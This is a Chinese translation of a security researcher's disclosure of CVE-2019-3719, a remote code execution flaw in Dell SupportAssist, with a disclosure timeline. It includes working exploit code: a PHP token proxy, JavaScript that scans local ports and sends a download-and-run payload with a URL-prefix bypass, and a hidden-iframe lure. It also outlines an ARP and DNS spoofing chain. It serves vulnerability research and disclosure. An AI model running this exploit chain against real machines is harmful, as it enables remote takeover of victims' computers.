# 戴尔电脑SupportAssist严重缺陷 可导致客户机RCE

阅读量 **473149**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-05-10 16:30:21

 **x**

##### 译文声明

本文是翻译文章，文章原作者 d4stiny，文章来源：d4stiny.github.io

原文地址：<https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01fc33c9fe237d87c8.jpg)

## 前言

你在使用哪一款电脑？谁制作的？你有没有想过你的电脑自带哪些东西？当提到各种远程代码执行漏洞时，我们可能会想到操作系统中的这类漏洞，另一个攻击向量则是”我的电脑上有哪些第三方软件？”。在本文中，我将介绍我在[SupportAssist](https://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist)(戴尔驱动助手)上发现的一个远程代码执行漏洞，该软件”会主动检查系统硬件和软件的运行状况”，并且”已预装在大多数运行Windows操作系统的全新戴尔设备上”。

## 发现漏洞

在去年9月份，我使用了七年之久的MacbookPro再也无法正常工作了，我在市场上买了一台新的笔记本电脑。我的目标是一台价格实惠，性能出众的笔记本，于是我选择了戴尔的G3
15。同时，我将1TB的机械硬盘升级为SSD。在升级完毕，重装windows后，需要重新安装驱动程序。这时事情开始变得有趣起来。访问戴尔服务站点后，我发现一个有趣的选项。

![](https://p0.ssl.qhimg.com/t010c157df5000fd237.png)

“Detect PC（检测个人电脑）”？它是怎么实现的呢？抱着这个疑问，我点击了它，看看会发生什么。

![](https://p2.ssl.qhimg.com/t01f4ec562ffd1d1323.png)

这是一个自动安装驱动的程序。尽管这点非常方便，但看起来有些风险。因为我的电脑刚刚重装，所以没有安装代理，我决定继续安装驱动，看看会发生什么。戴尔声称可以通过网站来更新用户的驱动，这非常可疑。

单击安装按钮，就可以轻松安装它。在系统后台，驱动助手创建了`SupportAssist代理`和`Dell
硬件助手`服务。这些服务由一些.NET编写的二进制文件构成，因此我可以轻松对其 **逆向分析** 。安装完成后，我回到戴尔站点，看看它能检测什么。

![](https://p4.ssl.qhimg.com/t01688f3bc2add0a5f3.png)

我打开Chrome开发者工具，选择网络栏，然后点击网页上的”Detect Drivers”。

![](https://p5.ssl.qhimg.com/t01785048ac25feb53a.png)

这个网站会发送请求至我的笔记本上本地的8884端口。使用 **Process Hacker**
我发现`SupportAssist代理`在这个端口上开启了一个web服务器。这个端口上暴露着各种戴尔服务的空闲API接口，用于与戴尔网站发出的各种请求进行通信。观察web服务器的响应，可以发现它严格遵循
**Access-Control-Allow-Origin：<https://www.dell.com>**策略，防止接受其他网站发出的请求。

在web浏览器端，客户需要提供一个签名，该签名用于验证各种命令。向`https://www.dell.com/support/home/cn/zh/cndhs1/drivers/driversbyscan/getdsdtoken`发出请求可以生成签名，即使签名过期，再次生成也可以使用。点击开始下载驱动程序，接下来的请求非常有趣：

    
    
    POST http://127.0.0.1:8884/downloadservice/downloadmanualinstall?expires=expiretime&signature=signature
    Accept: application/json, text/javascript, */*; q=0.01
    Content-Type: application/json
    Origin: https://www.dell.com
    Referer: https://www.dell.com/support/home/us/en/19/product-support/servicetag/xxxxx/drivers?showresult=true&files=1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
    

内容：

    
    
    [
        {
        "title":"Dell G3 3579 and 3779 System BIOS",
        "category":"BIOS",
        "name":"G3_3579_1.9.0.exe",
        "location":"https://downloads.dell.com/FOLDER05519523M/1/G3_3579_1.9.0.exe?uid=29b17007-bead-4ab2-859e-29b6f1327ea1&fn=G3_3579_1.9.0.exe",
        "isSecure":false,
        "fileUniqueId":"acd94f47-7614-44de-baca-9ab6af08cf66",
        "run":false,
        "restricted":false,
        "fileId":"198393521",
        "fileSize":"13 MB",
        "checkedStatus":false,
        "fileStatus":-99,
        "driverId":"4WW45",
        "path":"",
        "dupInstallReturnCode":"",
        "cssClass":"inactive-step",
        "isReboot":true,
        "DiableInstallNow":true,
        "$$hashKey":"object:175"
        }
    ]
    

这表明似乎web客户端可以直接向`SupportAssist代理`服务发出请求来运行”下载并手动安装”程序。于是，我开始在`SupportAssist代理`上搜寻web服务器，试图找出它可以发出哪些命令。

首先，戴尔驱动助手会在8884，8883，8886或8885端口上开启一个web服务器（System.Net.HttpListener）。选择哪个端口取决于哪些时开放的，默认选择8884。在请求中，`HttpListenerServiceFacade`上的`ListenerCallback`会调用`ClientServiceHandler.ProcessRequest`。

`ClientServiceHandler.ProcessRequest`是web服务器的基础方法，该方法会对请求进行完整性检查以及其他的检查，确保请求来自本地服务器。接下来我将介绍完整性检查的一些问题，前面讲的东西对实现RCE不是很重要。

对我们进行完整性检查的重点是`ClientServiceHandler.ProcessRequest`，尤其是`referrer`部分。`ProcessRequest`会调用以下函数确保我来自戴尔官方网站：

    
    
    // Token: 0x060000A8 RID: 168 RVA: 0x00004EA0 File Offset: 0x000030A0
    public static bool ValidateDomain(Uri request, Uri urlReferrer)
    {
        return SecurityHelper.ValidateDomain(urlReferrer.Host.ToLower()) && (request.Host.ToLower().StartsWith("127.0.0.1") || request.Host.ToLower().StartsWith("localhost")) &&request.Scheme.ToLower().StartsWith("http") && urlReferrer.Scheme.ToLower().StartsWith("http");
    }
    
    // Token: 0x060000A9 RID: 169 RVA: 0x00004F24 File Offset: 0x00003124
    public static bool ValidateDomain(string domain)
    {
        return domain.EndsWith(".dell.com") || domain.EndsWith(".dell.ca") || domain.EndsWith(".dell.com.mx") || domain.EndsWith(".dell.com.br") || domain.EndsWith(".dell.com.pr") || domain.EndsWith(".dell.com.ar") || domain.EndsWith(".supportassist.com");
    }
    

上面这个函数事实上不可靠，不能有效地检查我来自哪里，反而帮助了黑客。为了绕过Referer/Origin的检查，我总结了几个方法：

  1. 在戴尔任意站点上找出一个XSS漏洞（找到后我需要将其指向驱动助手的站点）
  2. 找出一个子域名接管漏洞
  3. 从本地程序发出请求
  4. 生成随机子域名名称，然后使用外部机器DNS劫持受害者。然后，如果受害者访问[random].dell.com，我可以在服务器上获取响应。

最后我选择第四个方法，后续我会解释原因。验证请求的Referer/Origin后，`ProcessRequest`根据GET，POST和OPTIONS将请求发送至对应的函数。

当我继续了解戴尔驱动助手是如何工作时，我拦截到很多来自戴尔支持站点的不同类型的请求。由于我的笔记本有很多待定的更新，我能够在浏览器控制台中持续拦截到请求。

首先，网站通过固定的端口定期与服务方法”isalive”通信，从而检测驱动助手。有意思的是，它传递了一个”Signature”参数和一个”Expires”参数。为了获取更多信息，我对浏览器端的JS做了逆向分析，发现了下面几点：

  1. 首先，浏览器向`https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken`发出请求，获取最新的”Token”值，或者说我前面提到的签名。同时，这个端点还提供了”Expires Token”。这解决了签名的问题。
  2. 下一步，浏览器以下面这个格式向每个服务端口发出请求：`http://127.0.0.1:[SERVICEPORT]/clientservice/isalive/?expires=[EXPIRES]&signature=[SIGNATURE]`。
  3. 正确的服务端口收到请求后，驱动助手客户端发出下面这种格式的响应： 
    
        {
     "isAlive": true,
     "clientVersion": "[CLIENT VERSION]",
     "requiredVersion": null,
     "success": true,
     "data": null,
     "localTime": [EPOCH TIME],
     "Exception": {
         "Code": null,
         "Message": null,
         "Type": null
     }
    }
    

  4. 浏览器收到这个响应后，确定服务端口，并持续通过这个端口发出进一步请求。

在观察我可以发出的各种请求时，我注意到通过“getsysteminfo”路由获取我的电脑上所有硬件的具体信息。通过跨站脚本，我也可以获取这些数据，这其实也是漏洞，因为我完全可以收集系统的指纹，找出一些敏感信息。

下面是驱动助手代理公开的一些方法：

    
    
    clientservice_getdevicedrivers - Grabs available updates.
    diagnosticsservice_executetip - Takes a tip guid and provides it to the PC Doctor service (Dell Hardware Support).
    downloadservice_downloadfiles - Downloads a JSON array of files.
    clientservice_isalive - Used as a heartbeat and returns basic information about the agent.
    clientservice_getservicetag - Grabs the service tag.
    localclient_img - Connects to SignalR (Dell Hardware Support).
    diagnosticsservice_getsysteminfowithappcrashinfo - Grabs system information with crash dump information.
    clientservice_getclientsysteminfo - Grabs information about devices on system and system health information optionally.
    diagnosticsservice_startdiagnosisflow - Used to diagnose issues on system.
    downloadservice_downloadmanualinstall - Downloads a list of files but does not execute them.
    diagnosticsservice_getalertsandnotifications - Gets any alerts and notifications that are pending.
    diagnosticsservice_launchtool - Launches a diagnostic tool.
    diagnosticsservice_executesoftwarefixes - Runs remediation UI and executes a certain action.
    downloadservice_createiso - Download an ISO.
    clientservice_checkadminrights - Check if the Agent privileged.
    diagnosticsservice_performinstallation - Update SupportAssist.
    diagnosticsservice_rebootsystem - Reboot system.
    clientservice_getdevices - Grab system devices.
    downloadservice_dlmcommand - Check on the status of or cancel an ongoing download.
    diagnosticsservice_getsysteminfo - Call GetSystemInfo on PC Doctor (Dell Hardware Support).
    downloadservice_installmanual - Install a file previously downloaded using downloadservice_downloadmanualinstall.
    downloadservice_createbootableiso - Download bootable iso.
    diagnosticsservice_isalive - Heartbeat check.
    downloadservice_downloadandautoinstall - Downloads a list of files and executes them.
    clientservice_getscanresults - Gets driver scan results.
    downloadservice_restartsystem - Restarts the system.
    

我对`downloadservice_downloadandautoinstall`非常感兴趣。它通过某个URL下载文件，并且执行它。当用户需要自动安装某些驱动程序时，浏览器会调用这个方法。

  1. 找到哪些驱动需要更新后，浏览器会发出一个POST请求至 “[http://127.0.0.1:[SERVICEPORT]/downloadservice/downloadandautoinstall?expires=[EXPIRES]&signature=[SIGNATURE]”。](http://127.0.0.1:%5BSERVICEPORT%5D/downloadservice/downloadandautoinstall?expires=%5BEXPIRES%5D&signature=%5BSIGNATURE%5D%22%E3%80%82)
  2. 同时，浏览器发送的请求的内容为JSON格式： 
    
        [
     {
    "title":"DOWNLOAD TITLE",
    "category":"CATEGORY",
     "name":"FILENAME",
     "location":"FILE URL",
     "isSecure":false,
     "fileUniqueId":"RANDOMUUID",
     "run":true,
     "installOrder":2,
     "restricted":false,
     "fileStatus":-99,
     "driverId":"DRIVER ID",
     "dupInstallReturnCode":0,
     "cssClass":"inactive-step",
     "isReboot":false,
     "scanPNPId":"PNP ID",
     "$$hashKey":"object:210"
     }
    ]
    

  3. 在做完基本完整性检查之后，ClientServiceHandler.ProcessRequest将发送ServiceMethod和参数给ClientServiceHandler.HandlePost。
  4. ClientServiceHandler.HandlePost将所有参数放入一个数组，然后调用ServiceMethodHelper.CallServiceMethod方法。
  5. ServiceMethodHelper.CallServiceMethod方法充当调度函数，调用ServiceMethod的函数。对于我们来说，就是上面的“downloadandautoinstall”方法： 
    
        if (service_Method == "downloadservice_downloadandautoinstall")
    {
     string files5 = (arguments != null && arguments.Length != 0 && arguments[0] != null) ? arguments[0].ToString() : string.Empty;
     result = DownloadServiceLogic.DownloadAndAutoInstall(files5, false);
    }
    

然后调用DownloadServiceLogic.DownloadAutoInstall函数，提供的文件在我们的JSON payload中。

  6. DownloadServiceLogic.DownloadAutoInstall函数其实是DownloadServiceLogic._HandleJson的包装器（i.e 处理异常）。
  7. DownloadServiceLogic._HandleJson函数用于反序列化JSON中的payload，其中包含要下载的文件，然后在进行完整性检查： 
    
        foreach (File file in list)
    {
     bool flag2 = file.Location.ToLower().StartsWith("http://");
     if (flag2)
     {
         file.Location = file.Location.Replace("http://", "https://");
     }
     bool flag3 = file != null && !string.IsNullOrEmpty(file.Location) && !SecurityHelper.CheckDomain(file.Location);
     if (flag3)
     {
         DSDLogger.Instance.Error(DownloadServiceLogic.Logger, "InvalidFileException being thrown in _HandleJson method");
         throw new InvalidFileException();
     }
    }
    DownloadHandler.Instance.RegisterDownloadRequest(CreateIso, Bootable, Install, ManualInstall, list);
    

上面的这段代码会循环遍历所有文件，检查我们提供的文件URL是否以 http:// 开头（如果不是，则替换为https://
），同时还会检查URL是否与Dell的下载服务器列表相匹配（不是所有戴尔子域）：

    
    
    public static bool CheckDomain(string fileLocation)
    {
        List<string> list = new List<string>
        {
            "ftp.dell.com",
            "downloads.dell.com",
            "ausgesd4f1.aus.amer.dell.com"
        };
    
        return list.Contains(new Uri(fileLocation.ToLower()).Host);
    }
    

最后，如果所有检查都通过了，文件将被发送至DownloadHandler.RegisterDownloadRequest方法，通过驱动助手下载并以管理员身份运行该文件。

OK，到现在我们已经获取到大量的信息了，足以我们编写漏洞利用程序。

## Exlpoitation

我们面临的第一个问题是如何向客户端的驱动助手程序发出请求。假设我们的身份是戴尔的某个子域，后面我将介绍我是如何做到这一点的。接下来我将模仿浏览器的行为，使用JS发送请求。

还有一件事，我们得先找到服务端口。通过发送请求给“/clientservice/isalive”，可以遍历预定义端口，最后找到服务端口。问题是我们需要提供签名值。通过发送请求至“[https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken”，](https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken%E2%80%9D%EF%BC%8C)
我们可以获取签名值。

实际做起来并不像理论那样直接。获取签名的URL中“Access-Control-Allow-Origin”设置为“[https://www.dell.com”。](https://www.dell.com%E2%80%9D%E3%80%82)
这是一个问题，因为我们处于某个子域中，它可能不是https协议。我们想到一个解决办法，直接从自己的服务器发出请求！

从”getdsdtoken”获取的签名适用于所有机器。我制作了一个简单的PHP脚本来抓取签名值：

    
    
    <?php
    header('Access-Control-Allow-Origin: *');
    echo file_get_contents('https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken');
    ?>
    

标头设置为允许任何人发出请求，我们只是获取签名，用作“getdsdtoken”路由的代理。“getdsdtoken”路由返回带有签名和到期时间的JSON。我们可以在结果上使用JSON.parse函数导出签名值，并放入javascript对象中。

现在我们有了签名值和到期时间，可以开始发出请求了。我创建了一个循环遍历端口的函数，如果我们找到服务端口，我们将`server_port`全局变量设置为这个端口：

    
    
    function FindServer() {
        ports.forEach(function(port) {
            var is_alive_url = "http://127.0.0.1:" + port + "/clientservice/isalive/?expires=" + signatures.Expires + "&signature=" + signatures.IsaliveToken;
            var response = SendAsyncRequest(is_alive_url, function(){server_port = port;});
        });
    }
    

确定服务器后，我们可以发送payload了。这是最困难的一步，在通过“downloadandautoinstall”执行payload之前，我们遇到了非常大的困难。

从最困难开始，驱动助手客户端确定了文件来源位置的白名单。它的来源主机 **必须**
为“ftp.dell.com”，“downloads.dell.com”或“ausgesd4f1.aus.amer.dell.com”其中的一个。我放弃了这点，因为我在它们上面找不到任何重定向漏洞。后来我发现，可以尝试中间人攻击。

如果我们使驱动助手客户端发送http类型的请求，我们就可以轻松拦截，更改响应！这解决了最大的问题。

第二个困难是，我发现解决第一个问题的方法被针对了。我前面提到过，如果客户端发现URL开始是http:// ，它将被替换为https://
。我们无法拦截，更改使用https协议的的请求。绕过这点的关键在于”如果客户端发现URL是http:// ，它将被替换为https://
“。OK，如果URL不以http:// 开始，而是插入了http:// ，那么就不会被替代。找到这样一个URL不是一件容易事，最后我找出了”  
<http://downloads.dell.com/abcdefg>“ （前面的空格有意义）。这样成功绕过检查，因为字符串以”
“开头，从而保留了”http:// “。

我写了下面这个函数，用于发送payload：

    
    
    function SendRCEPayload() {
        var auto_install_url = "http://127.0.0.1:" + server_port + "/downloadservice/downloadandautoinstall?expires=" + signatures.Expires + "&signature=" + signatures.DownloadAndAutoInstallToken;
    
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("POST", auto_install_url, true);
    
        var files = [];
    
        files.push({
        "title": "SupportAssist RCE",
        "category": "Serial ATA",
        "name": "calc.EXE",
        "location": " http://downloads.dell.com/calc.EXE", // those spaces are KEY
        "isSecure": false,
        "fileUniqueId": guid(),
        "run": true,
        "installOrder": 2,
        "restricted": false,
        "fileStatus": -99,
        "driverId": "FXGNY",
        "dupInstallReturnCode": 0,
        "cssClass": "inactive-step",
        "isReboot": false,
        "scanPNPId": "PCI\VEN_8086&DEV_282A&SUBSYS_08851028&REV_10",
        "$$hashKey": "object:210"});
    
        xmlhttp.send(JSON.stringify(files)); 
    }
    

下面可以从局域网入手，开展攻击。下面是我在Poc中攻击者的机器中的操作：

  1. 抓取局域网区域目标主机的IP地址。
  2. 启动模拟的Web服务器，提供我们要发送的有效负载的文件名。Web服务器会检查主机头是否是`downloads.dell.com`，如果是，则发送二进制文件的payload。如果请求主机中包含dell.com但不是downloads域，则发送我们上面这段javascript payload。
  3. 对受害者进行ARP欺骗，启用ip转发，然后向受害者发送一个ARP数据包，告诉它我们是路由器，再发送一个ARP数据包给路由，假装我们是受害者机器。在漏洞利用期间，每隔几秒重复发送这些数据包。结束后，将原始的mac地址发送给受害者和路由器。
  4. 最后，我们通过iptables将DNS数据包转发到netfilter queue来进行DNS欺骗。同时监听这个netfilter queue，然后检查请求的DNS名是否为目标URL。如果是，我们发送一个伪造的DNS数据包，表示我们的IP是该URL后面的真实IP地址。
  5. 当受害者访问我们的子域名（直接通过url或间接通过iframe）时，会自动发送恶意javascript payload，找到驱动助手代理的服务端口，通过我们前面创建的php文件中获取签名，然后发送RCE的payload。当驱动助手代理程序处理RCE有效负载时，它会向`downloads.dell.com`发送请求，下载并执行我们的二进制payload。

你可以[在此处](https://www.dell.com/support/article/us/en/19/sln316857/dsa-2019-051-dell-supportassist-client-multiple-vulnerabilities)阅读戴尔官方的公开的信息。

## 攻击演示

下面是该漏洞简单的一段Poc演示视频。你可以在[这里](https://github.com/D4stiny/Dell-Support-Assist-RCE-PoC)下载poc的源码。

<https://youtu.be/0cTfnZ04jgQ>

视频中的dellrce.html内容为：

    
    
    <h1>CVE-2019-3719</h1>
    <h1>Nothing suspicious here... move along...</h1>
    <iframe src="http://www.dellrce.dell.com" style="width: 0; height: 0; border: 0; border: none; position: absolute;"></iframe>
    

###  时间线

10/26/2018 – 向戴尔发送初始writeup。

10/29/2018 – 戴尔初步回应。

11/22/2018 – 戴尔确认存在漏洞。

11/29/2018 – 戴尔计划于2019年第一季度发布“暂定”修复程序。

01/28/2019 – 戴尔的披露日期延长至3月。

03/13/2019 – 戴尔仍在修复漏洞，计划在4月底披露漏洞。

04/18/2019 –
戴尔官方发布漏洞[咨询](https://www.dell.com/support/article/us/en/19/sln316857/dsa-2019-051-dell-supportassist-client-multiple-vulnerabilities)。

本文翻译自d4stiny.github.io [原文链接](https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **NullCoopX** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/177961](/post/id/177961)

安全客 - 有思想的安全新媒体

本文转载自: [d4stiny.github.io](https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/)

如若转载,请注明出处： <https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [RCE](/tag/RCE)
  * [系统安全](/tag/系统安全)
  * [Dell](/tag/Dell)

 **+1** __15赞

 __收藏

![](https://p4.ssl.qhimg.com/t0179f0dddab9c078ca.jpg) NullCoopX

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

